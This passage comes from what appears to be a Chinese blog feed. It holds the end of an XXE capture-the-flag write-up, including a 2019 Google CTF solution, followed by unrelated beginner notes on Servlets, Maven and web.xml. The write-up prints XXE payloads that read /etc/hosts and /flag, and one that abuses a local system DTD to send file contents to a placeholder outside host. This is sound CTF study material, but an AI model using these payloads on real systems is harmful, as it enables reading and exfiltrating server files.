punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>1111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php编写的网站中，php伪协议基本可以说是最可用的协议</p><p><img src="image-20210922120250632.png" alt="image-20210922120250632"></p><blockquote><p>查看内网的存活主机</p></blockquote><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/hosts"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>1111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210922120340118.png" alt="image-20210922120340118"><br>主要就是使用几个Linux系统的特殊文件夹</p><p>这里也不只有/etc/hosts文件，还可以通用/proc目录下的多个文件查看，一般使用hosts足以</p><p>/proc文件目录：</p><pre class="line-numbers language-linux"><code class="language-linux"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///flag"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>1111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>调用其他服务器的DTD文档</p></blockquote><h3 id="先留着，服务器这几天炸了，没得试"><a href="#先留着，服务器这几天炸了，没得试" class="headerlink" title="(先留着，服务器这几天炸了，没得试)"></a>(先留着，服务器这几天炸了，没得试)</h3><blockquote><p>得到flag</p></blockquote><pre class="line-numbers language-flag"><code class="language-flag">flag{dd841ec9-3408-4ce8-9f13-b1304a2d987e}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2019-Google-CTF-XXE"><a href="#2019-Google-CTF-XXE" class="headerlink" title="2019 Google CTF-XXE"></a>2019 Google CTF-XXE</h2><p><img src="image-20210922135607013.png" alt="image-20210922135607013"></p><p>CTF三部曲直接开始</p><p><img src="image-20210922135954340.png" alt="image-20210922135954340"></p><p>json格式，学的XXE , 不妨试一试改xml</p><p><img src="image-20210922140541726.png" alt="image-20210922140541726"></p><p>将message从json格式改为xml格式</p><p><img src="image-20210922141010151.png" alt="image-20210922141010151"></p><p>回显成功</p><p>payload:</p><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE message [<!ELEMENT message (#PCDATA)><!ENTITY id "1234010123502402340">]><message>&id;</message><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload我是直接抄的wp，但后面我自己研究了一下，所以分析一波</p><p>不想看就跳过这部分</p><blockquote><p>分析</p></blockquote><p>将json格式的数据改为xml格式，可以使用工具也可以直接手敲，原理都一样</p><p>题目中给我们的是<code>&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;</code></p><p>xml和json的数据有一个对应法则，json的key值对应xml标签，json的value对应xml的值</p><p>所以可以改为</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>135601360123502401401250<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20210922143808992.png" alt="image-20210922143808992"></p><p>报错，根据错误提示，我们需要一个XML-DTD</p><p>所以改为xml引用DTD的值</p><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0"?><!DOCTYPE root [<!ENTITY aaa "135601360123502401401250">]><message>&aaa;</message><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>仍然报错</p><p><img src="image-20210922144133336.png" alt="image-20210922144133336"></p><p>root和message不匹配，说明题目允许解析的DTD文档根标签需要和xml传入的标签一致，故将根标签改成message</p><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0"?><!DOCTYPE message [<!ENTITY aaa "135601360123502401401250">]><message>&aaa;</message><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又报错，说没有ELEMENT声明，这个我真没查到为什么一定要写，大概和我没有把xml完整学一遍有关</p><p><img src="image-20210922144519907.png" alt="image-20210922144519907"></p><p>他说缺啥我就给啥</p><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0"?><!DOCTYPE message [<!ELEMENT message (#PCDATA)><!ENTITY aaa "135601360123502401401250">]><message>&aaa;</message><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就是wp里的payload了</p><blockquote><p>CDATA和PCDATA</p></blockquote><ul><li>CDATA是指CDATA就是指字符串</li><li>PCDATA可以是字符串、子元素、字符串和子元素 ,是混合类型</li></ul><blockquote><p>攻击部分</p></blockquote><p>在成功后，开始攻击</p><p>回显不会改变，所以不能直接写请求包上面，而外部实体无法调用</p><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><!ENTITY % dtd SYSTEM "https://x.com"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调用会直接报错</p><p>这里wp调用了Linux自带的dtd</p><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="utf-8"?> <!DOCTYPE message [ <!ELEMENT message (#PCDATA)><!ENTITY id "1234010123502402340"><!ENTITY % dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">  //加载了自带的dtd<!ENTITY % ISOamsa '  <!ENTITY &#x25; file SYSTEM "https://x.com">  // 嵌套一个外部引用  &#x25;file; // 引用外部引用'> // &#x25是HTML的一种编码方式%dtd;]><message>&id;</message><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>最终payload</p><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="utf-8"?> <!DOCTYPE message [ <!ELEMENT message (#PCDATA)><!ENTITY id "1234010123502402340"><!ENTITY % dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamsa '  // 重写docbookx.dtd的ISOamsa方法  <!ENTITY &#x25; file SYSTEM "file:///flag">  <!ENTITY &#x25; all "<!ENTITY &#x26;#x25; xxe SYSTEM &#x27;https://x.com/&#x25;file;&#x27;  >">  &#x25;all;  &#x25;xxe;'>%dtd;]><message>&id;</message><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210922174839837.png" alt="image-20210922174839837"></p><p><strong>ubuntu系统自带 <code>/usr/share/yelp/dtd/docbookx.dtd</code> 文件</strong></p><p><strong>它定义了很多参数实体并调用,所以我们可以在内部重写一个该dtd文件中含有的参数实体</strong></p><p><img src="image-20210922174507023.png" alt="image-20210922174507023"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><code>https://ca01h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb入门</title>
      <link href="/2021/09/04/JavaWeb%E5%85%A5%E9%97%A8/"/>
      <url>/2021/09/04/JavaWeb%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>笔记内容出自：<a href="https://www.bilibili.com/video/BV12J411M7Sj">https://www.bilibili.com/video/BV12J411M7Sj</a></strong></p><h1 id="JavaWeb概述"><a href="#JavaWeb概述" class="headerlink" title="JavaWeb概述"></a><code>JavaWeb</code>概述</h1><p><img src="image-20210904133613352.png" alt="image-20210904133613352"></p><p>静态<code>Web</code></p><p><img src="image-20210904135237190.png" alt="image-20210904135237190"></p><h2 id="Web服务器"><a href="#Web服务器" class="headerlink" title="Web服务器"></a><code>Web</code>服务器</h2><h3 id="技术问题："><a href="#技术问题：" class="headerlink" title="技术问题："></a>技术问题：</h3><h4 id="ASP："><a href="#ASP：" class="headerlink" title="ASP："></a><code>ASP</code>：</h4><p><img src="image-20210904175127595.png" alt="image-20210904175127595"></p><p><strong><code>ASP</code>是最早流行的<code>Web</code>服务器，使用<code>C#</code>语言</strong></p><h4 id="php"><a href="#php" class="headerlink" title="php"></a><code>php</code></h4><p><img src="image-20210904175400586.png" alt="image-20210904175400586"></p><p><strong>注：<code>php</code>的安全性也不高</strong></p><h4 id="JSP-Servlet"><a href="#JSP-Servlet" class="headerlink" title="JSP/Servlet"></a><code>JSP/Servlet</code></h4><p><img src="image-20210904175629177.png" alt="image-20210904175629177"></p><p><strong><code>jsp就是在html代码里嵌入一些java代码</code></strong></p><p><strong>三高：高并发，高可用，高性能</strong></p><h3 id="Web服务器-1"><a href="#Web服务器-1" class="headerlink" title="Web服务器"></a><code>Web</code>服务器</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a><code>IIS</code></h4><p>微软的；<code>Windows</code>自带，常用于搭建<code>FTP</code>文件服务器</p><h4 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a><code>Tomcat</code></h4><p><img src="image-20210904180236143.png" alt="image-20210904180236143"></p><p>现在最新版本是10.0.1</p><h5 id="文件夹作用"><a href="#文件夹作用" class="headerlink" title="文件夹作用"></a>文件夹作用</h5><p><img src="image-20210904181220966.png" alt="image-20210904181220966"></p><p><img src="image-20210904192700660.png" alt="image-20210904192700660"></p><p><code>shutdown.bat</code>关闭</p><h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p><code>Tomcat</code>核心配置文件是<code>conf</code>文件夹下的<code>server.xml</code>文件</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a><code>HTTP</code></h2><p><img src="image-20210904200941614.png" alt="image-20210904200941614"></p><p><img src="image-20210904201820235.png" alt="image-20210904201820235"></p><p><strong>请求有两种，请求行和请求头</strong></p><p><img src="image-20210904202359734.png" alt="image-20210904202359734"></p><p><strong>响应也有两种，响应头和响应体</strong></p><p><img src="image-20210904203009163.png" alt="image-20210904203009163"></p><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a><code>Maven</code></h1><p><strong><code>Maven</code>— 项目架构管理工具</strong></p><p><strong>目前用来便捷的导入<code>jar</code>包</strong></p><p><strong><code>Maven</code>核心思想：约定大于配置</strong></p><ul><li><code>Maven</code>会规定好如何去编写<code>java</code>代码，必须按这个规范来</li></ul><p><strong>下载地址：<code>https://maven.apache.org/download.cgi</code></strong></p><p>环境变量以及换源自行配置</p><h2 id="配置本地仓库"><a href="#配置本地仓库" class="headerlink" title="配置本地仓库"></a>配置本地仓库</h2><p><img src="image-20210904210434228.png" alt="image-20210904210434228"></p><p>如图，在该位置将路径改为自己设定的文件夹</p><h2 id="在idea中使用"><a href="#在idea中使用" class="headerlink" title="在idea中使用"></a>在<code>idea</code>中使用</h2><p><img src="image-20210905102115555.png" alt="image-20210905102115555"></p><p><img src="image-20210905102609615.png" alt="image-20210905102609615"></p><p><img src="image-20210905104658995.png" alt="image-20210905104658995"></p><p>打包分两种：<code>war</code>和<code>jar</code></p><p><code>war</code>：javaweb应用</p><p><code>jar</code>：java应用</p><h1 id="Servlet程序"><a href="#Servlet程序" class="headerlink" title="Servlet程序"></a>Servlet程序</h1><p>是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p><p>使用 Servlet，可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p><p><img src="image-20210905170229558.png" alt="image-20210905170229558"></p><p><code>Servlet</code>是一个接口，我们把实现了该接口的java程序叫Servlet</p><h2 id="HelloServlet"><a href="#HelloServlet" class="headerlink" title="HelloServlet"></a>HelloServlet</h2><p>1、构建一个普通的Maven项目，可以删除src目标，用建立Moudel的方式建立多个工程</p><p>2、Maven工程可以嵌套</p><p><img src="image-20210905173432200.png" alt="image-20210905173432200"></p><p>优化：</p><blockquote><p>修改web.xml为最新版本</p><p>将maven的结构搭建完整</p></blockquote><h2 id="Serlvet-实现"><a href="#Serlvet-实现" class="headerlink" title="Serlvet 实现"></a>Serlvet 实现</h2><p>Serlvet接口有两个实现类</p><h3 id="继承HttpServlet"><a href="#继承HttpServlet" class="headerlink" title="继承HttpServlet"></a>继承HttpServlet</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//响应类型</span>        resp<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取输出流</span>        PrintWriter writer <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;h1>这是继承HttpServlet接口&lt;/h1>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="继承GenericServlet"><a href="#继承GenericServlet" class="headerlink" title="继承GenericServlet"></a>继承GenericServlet</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> 继承GenericServlet <span class="token keyword">extends</span> <span class="token class-name">GenericServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span>ServletRequest servletRequest<span class="token punctuation">,</span> ServletResponse servletResponse<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>            <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>GenericServlet直接实现了Servlet接口，使用时需要重写service方法</strong></p><p><strong>HttpServlet继承GenericServlet类,它重写了service方法</strong></p><p><strong>所以使用Servlet接口我们一般==继承HttpServlet==，而不是GenericServlet和直接实现Servlet</strong></p><blockquote><p>结构</p></blockquote><p><img src="image-20210905181421300.png" alt="image-20210905181421300"></p><h3 id="Servlet方法实现"><a href="#Servlet方法实现" class="headerlink" title="Servlet方法实现"></a>Servlet方法实现</h3><p>继承HttpServlet类无需实现service</p><p>但作为网页最常用的get和post传参，我们一般需要实现doGet()和doPost()方法</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token function">doPost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//一般我们只会用到get或post其一，所以将另一个直接调回即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注册Servlet"><a href="#注册Servlet" class="headerlink" title="注册Servlet"></a>注册Servlet</h2><p>写好的Servlet是存放在java中的，但浏览器这样访问过于麻烦也不安全，所以需要注册该Servlet映射，也叫定义路径</p><p>一个Servlet对应一个请求地址</p><blockquote><p>web.xml(路径在这里定义)</p></blockquote><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>Archetype Created Web Application<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--  注册servlet--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.atmujie.Servlet.HelloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--  一个servlet对应一个mapping映射--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//开启响应流</span>        PrintWriter writer <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello Servlet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210905183134381.png" alt="image-20210905183134381"></p><h2 id="Servlet原理"><a href="#Servlet原理" class="headerlink" title="Servlet原理"></a>Servlet原理</h2><h3 id="Servlet处理流程"><a href="#Servlet处理流程" class="headerlink" title="Servlet处理流程"></a>Servlet处理流程</h3><p><img src="image-20210905193006006.png" alt="image-20210905193006006"></p><p>java后端主要做两件事：</p><ul><li>接收并处理请求</li><li>给出响应的信息</li></ul><h3 id="mapping映射规则"><a href="#mapping映射规则" class="headerlink" title="mapping映射规则"></a>mapping映射规则</h3><ul><li>一个Servlet映射一个路径</li><li>一个Servlet映射多个路径</li><li>一个Servlet映射通用路径</li><li>指定前后缀映射</li></ul><h4 id="单路径映射"><a href="#单路径映射" class="headerlink" title="单路径映射"></a>单路径映射</h4><pre class="line-numbers language-xml"><code class="language-xml"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.atmujie.Servlet.HelloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--  一个servlet对应一个mapping映射--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="多路径映射"><a href="#多路径映射" class="headerlink" title="多路径映射"></a>多路径映射</h4><p><strong>一：定义多个mapping</strong></p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--  注册servlet--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.atmujie.Servlet.HelloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--  一个servlet对应多个mapping映射--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/hi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>二：定义通配符</strong></p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>helloServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/hello/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" 